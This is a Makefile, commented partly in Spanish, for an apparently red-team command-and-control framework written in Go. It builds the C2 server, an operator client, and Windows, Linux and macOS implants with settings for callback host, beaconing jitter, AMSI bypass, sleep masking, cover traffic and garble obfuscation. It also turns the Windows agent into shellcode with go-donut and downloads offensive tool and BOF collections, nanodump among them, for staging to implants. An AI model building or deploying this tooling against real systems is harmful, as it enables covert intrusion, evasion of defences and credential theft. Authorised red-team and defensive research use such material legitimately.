GOROOT     := /usr/local/go
GO         := $(GOROOT)/bin/go
override GOPATH      := $(HOME)/go
override GOMODCACHE  := $(HOME)/go/pkg/mod
export GOROOT GOPATH GOMODCACHE

## Directorio con .NET tools a precargar en data/uploads/
## Sobreescribir: make tools TOOLS_DIR=/otro/directorio
TOOLS_DIR  ?= /opt/tools/SharpCollection/NetFramework_4.5_x64
export PATH := $(GOROOT)/bin:$(PATH)
MODULE  := redteam

C2_HOST       ?= 127.0.0.1
SLEEP         ?= 60
JITTER        ?= 20
EVASION       ?= true
SLEEP_MASK    ?= ekko
AMSI_METHOD   ?= veh
KILL_DATE     ?=
OBFUSCATE     ?= false
COVER_TRAFFIC ?= false
AGENTPKG      := redteam/agents/agent-go
GARBLE        := $(GOPATH)/bin/garble

ifeq ($(OBFUSCATE),true)
  AGENT_BUILD := $(GARBLE) -literals -tiny build
else
  AGENT_BUILD := $(GO) build
endif
GUI_PORT ?= 8888
GUI_HOST ?= 127.0.0.1
PROFILE  ?= $(HOME)/.endgame/profiles/stark.json

.PHONY: all server client agent-exe agent-mtls agent-raw agent-linux agent-darwin certs run init deps bofs tools clean start build-start stop

all: server client agent-exe

## Install garble (binary obfuscator) — run once before using OBFUSCATE=true
garble-install:
	$(GO) install mvdan.cc/garble@latest

## Install system dependencies (run once as root or with sudo)
deps:
	@which apt-get >/dev/null 2>&1 && apt-get install -y \
	  mono-mcs \
	  gcc-mingw-w64-x86-64 \
	  ncat \
	  || echo "[!] apt-get not available, install manually: mono-mcs gcc-mingw-w64-x86-64"

## Initialize Go module and download dependencies
init: deps
	$(GO) mod init $(MODULE) 2>/dev/null || true
	$(GO) get github.com/mattn/go-sqlite3@latest
	$(GO) get github.com/google/uuid@latest
	$(GO) get github.com/Binject/go-donut@latest
	$(GO) get golang.org/x/sys@latest
	$(GO) mod tidy

## Build C2 server (Linux)
server:
	mkdir -p bin
	chmod 755 bin
	CGO_ENABLED=0 $(GO) build -o bin/c2-server ./cmd/server/
	chmod 755 bin/c2-server

## Build operator client (Linux)
client:
	mkdir -p bin
	chmod 755 bin
	CGO_ENABLED=0 $(GO) build -o bin/c2-client ./cmd/client/
	chmod 755 bin/c2-client

## Build Windows agent (.exe) via HTTP
## Usage: make agent-exe C2_HOST=10.2.20.200 SLEEP=5 EVASION=false OBFUSCATE=true COVER_TRAFFIC=true
agent-exe:
	mkdir -p bin
	CGO_ENABLED=0 GOOS=windows GOARCH=amd64 \
	$(AGENT_BUILD) \
	  -ldflags "-s -w \
	    -X '$(AGENTPKG).ServerURL=http://$(C2_HOST):8080' \
	    -X '$(AGENTPKG).Transport=http' \
	    -X '$(AGENTPKG).SleepSec=$(SLEEP)' \
	    -X '$(AGENTPKG).JitterPct=$(JITTER)' \
	    -X '$(AGENTPKG).EvasionPatches=$(EVASION)' \
	    -X '$(AGENTPKG).SleepMaskMode=$(SLEEP_MASK)' \
	    -X '$(AGENTPKG).AMSIMethod=$(AMSI_METHOD)' \
	    -X '$(AGENTPKG).CoverTraffic=$(COVER_TRAFFIC)' \
	    $(if $(KILL_DATE),-X '$(AGENTPKG).KillDate=$(KILL_DATE)')" \
	  -trimpath \
	  -o bin/agent.exe \
	  ./agents/agent-go/cmd/

## Build Windows agent (.exe) via mTLS (run 'make certs' first)
agent-mtls:
	mkdir -p bin
	CGO_ENABLED=0 GOOS=windows GOARCH=amd64 \
	$(AGENT_BUILD) \
	  -ldflags "-s -w \
	    -X '$(AGENTPKG).ServerURL=https://$(C2_HOST):8443' \
	    -X '$(AGENTPKG).Transport=mtls' \
	    -X '$(AGENTPKG).SleepSec=$(SLEEP)' \
	    -X '$(AGENTPKG).JitterPct=$(JITTER)' \
	    -X '$(AGENTPKG).EvasionPatches=$(EVASION)' \
	    -X '$(AGENTPKG).AgentCertPEM=$(shell cat certs/agent.crt 2>/dev/null | base64 -w0)' \
	    -X '$(AGENTPKG).AgentKeyPEM=$(shell cat certs/agent.key 2>/dev/null | base64 -w0)' \
	    -X '$(AGENTPKG).CACertPEM=$(shell cat certs/ca.crt 2>/dev/null | base64 -w0)' \
	    -X '$(AGENTPKG).SleepMaskMode=$(SLEEP_MASK)' \
	    -X '$(AGENTPKG).CoverTraffic=$(COVER_TRAFFIC)'" \
	  -trimpath \
	  -o bin/agent-mtls.exe \
	  ./agents/agent-go/cmd/

## Build Linux agent (ELF)
## Usage: make agent-linux C2_HOST=10.2.20.200 SLEEP=5
agent-linux:
	mkdir -p bin
	CGO_ENABLED=0 GOOS=linux GOARCH=amd64 \
	$(AGENT_BUILD) \
	  -ldflags "-s -w \
	    -X '$(AGENTPKG).ServerURL=http://$(C2_HOST):8080' \
	    -X '$(AGENTPKG).Transport=http' \
	    -X '$(AGENTPKG).SleepSec=$(SLEEP)' \
	    -X '$(AGENTPKG).JitterPct=$(JITTER)' \
	    -X '$(AGENTPKG).CoverTraffic=$(COVER_TRAFFIC)' \
	    $(if $(KILL_DATE),-X '$(AGENTPKG).KillDate=$(KILL_DATE)')" \
	  -trimpath \
	  -o bin/agent-linux \
	  ./agents/agent-go/cmd/

## Build macOS agent (Mach-O)
## Usage: make agent-darwin C2_HOST=10.2.20.200 SLEEP=5
agent-darwin:
	mkdir -p bin
	CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 \
	$(AGENT_BUILD) \
	  -ldflags "-s -w \
	    -X '$(AGENTPKG).ServerURL=http://$(C2_HOST):8080' \
	    -X '$(AGENTPKG).Transport=http' \
	    -X '$(AGENTPKG).SleepSec=$(SLEEP)' \
	    -X '$(AGENTPKG).JitterPct=$(JITTER)' \
	    -X '$(AGENTPKG).CoverTraffic=$(COVER_TRAFFIC)' \
	    $(if $(KILL_DATE),-X '$(AGENTPKG).KillDate=$(KILL_DATE)')" \
	  -trimpath \
	  -o bin/agent-darwin \
	  ./agents/agent-go/cmd/

## Convert agent.exe to raw shellcode using go-donut
agent-raw: agent-exe
	$(GO) run github.com/Binject/go-donut@v0.0.0-20220908180326-fcdcc35d591c \
	  -i bin/agent.exe \
	  -o bin/agent.bin \
	  -f 1 \
	  -a x64

## Generate CA + server certs (only needed once)
certs:
	mkdir -p certs
	$(GO) run ./cmd/server/ -gencerts-only

## Run server (HTTP :8080, mTLS :8443, Operator API :31337)
run: server
	./bin/c2-server \
	  -http-port 8080 \
	  -mtls-port 8443 \
	  -operator-port 31337 \
	  -db data/c2.db \
	  -certs certs \
	  -data data

## Compilar y arrancar servidor + cliente
build-start: server client start

## Arrancar servidor + cliente GUI en background (PROFILE=stark.json GUI_PORT=8888)
start:
	@[ -f bin/c2-server ] || { echo "[-] bin/c2-server no encontrado. Ejecuta: make server"; exit 1; }
	@[ -f bin/c2-client ] || { echo "[-] bin/c2-client no encontrado. Ejecuta: make client"; exit 1; }
	@[ -f /tmp/c2-server.pid ] && kill $$(cat /tmp/c2-server.pid) 2>/dev/null || true; rm -f /tmp/c2-server.pid
	@[ -f /tmp/c2-client.pid ] && kill $$(cat /tmp/c2-client.pid) 2>/dev/null || true; rm -f /tmp/c2-client.pid
	@sleep 0.3
	@setsid nohup $(CURDIR)/bin/c2-server \
	  -http-port 8080 -mtls-port 8443 -operator-port 31337 \
	  -db data/c2.db -certs certs -data data \
	  > /tmp/c2-server.log 2>&1 & echo $$! > /tmp/c2-server.pid
	@sleep 1
	@setsid nohup $(CURDIR)/bin/c2-client \
	  -profile $(PROFILE) -gui-host $(GUI_HOST) -gui-port $(GUI_PORT) -gui-only \
	  > /tmp/c2-client.log 2>&1 & echo $$! > /tmp/c2-client.pid
	@sleep 2
	@echo ""
	@grep -m1 "Web GUI" /tmp/c2-client.log || true
	@grep -m1 "Token:"  /tmp/c2-client.log || true
	@echo ""
	@echo "[*] logs: /tmp/c2-server.log  /tmp/c2-client.log"

## Parar servidor y cliente
stop:
	@[ -f /tmp/c2-server.pid ] && kill $$(cat /tmp/c2-server.pid) 2>/dev/null && echo "[*] server parado" || echo "[-] server no corría"; rm -f /tmp/c2-server.pid
	@[ -f /tmp/c2-client.pid ] && kill $$(cat /tmp/c2-client.pid) 2>/dev/null && echo "[*] client parado" || echo "[-] client no corría"; rm -f /tmp/c2-client.pid

## Run operator client with web GUI (GUI_PORT default 8888)
gui: client
	./bin/c2-client -profile $(PROFILE) -gui-port $(GUI_PORT)

SHARPCOLLECTION_REPO := https://github.com/Flangvik/SharpCollection
SHARPCOLLECTION_DIR  := tools/SharpCollection

## Precargar herramientas .NET en data/uploads/ (copia directa, sin API)
## Si TOOLS_DIR no existe, clona SharpCollection automáticamente.
## Uso: make tools
##      make tools TOOLS_DIR=/ruta/personalizada
tools:
	@mkdir -p data/uploads
	@if [ -d "$(TOOLS_DIR)" ]; then \
	  count=0; \
	  for f in "$(TOOLS_DIR)"/*.exe "$(TOOLS_DIR)"/*.dll "$(TOOLS_DIR)"/*.o; do \
	    [ -f "$$f" ] || continue; \
	    cp "$$f" "data/uploads/$$(basename $$f)"; \
	    count=$$((count+1)); \
	  done; \
	  echo "[+] $$count herramientas copiadas de $(TOOLS_DIR) → data/uploads/"; \
	else \
	  echo "[!] TOOLS_DIR no existe: $(TOOLS_DIR)"; \
	  echo "[*] Clonando SharpCollection (sparse, solo NetFramework_4.5_x64)..."; \
	  git clone --depth 1 --filter=blob:none --sparse \
	    $(SHARPCOLLECTION_REPO) $(SHARPCOLLECTION_DIR) -q || exit 1; \
	  git -C $(SHARPCOLLECTION_DIR) sparse-checkout set NetFramework_4.5_x64 -q; \
	  git -C $(SHARPCOLLECTION_DIR) checkout -q; \
	  count=0; \
	  for f in "$(SHARPCOLLECTION_DIR)/NetFramework_4.5_x64"/*.exe; do \
	    [ -f "$$f" ] || continue; \
	    cp "$$f" "data/uploads/$$(basename $$f)"; \
	    count=$$((count+1)); \
	  done; \
	  echo "[+] $$count herramientas clonadas → data/uploads/"; \
	fi

## Download/update BOF collections into bof/
bofs:
	@mkdir -p bof
	@for repo in \
	  "https://github.com/N7WEra/BofAllTheThings|bof/BofAllTheThings" \
	  "https://github.com/TrustedSec/CS-Situational-Awareness-BOF|bof/situational-awareness" \
	  "https://github.com/fortra/nanodump|bof/nanodump" \
	  "https://github.com/outflanknl/C2-Tool-Collection|bof/outflank" \
	  "https://github.com/ajpc500/BOFs|bof/ajpc500"; do \
	    url=$$(echo $$repo | cut -d'|' -f1); \
	    dir=$$(echo $$repo | cut -d'|' -f2); \
	    if [ -d "$$dir/.git" ]; then \
	      echo "[~] updating $$dir"; git -C $$dir pull -q --ff-only; \
	    else \
	      echo "[+] cloning $$url"; git clone -q --depth 1 $$url $$dir; \
	    fi; \
	done
	@echo "[+] BOFs instalados en bof/"
	@find bof/ -name "*.x64.o" | wc -l | xargs -I{} echo "    {} archivos .x64.o"

clean:
	rm -rf bin/ data/c2.db certs/ data/uploads/ data/downloads/
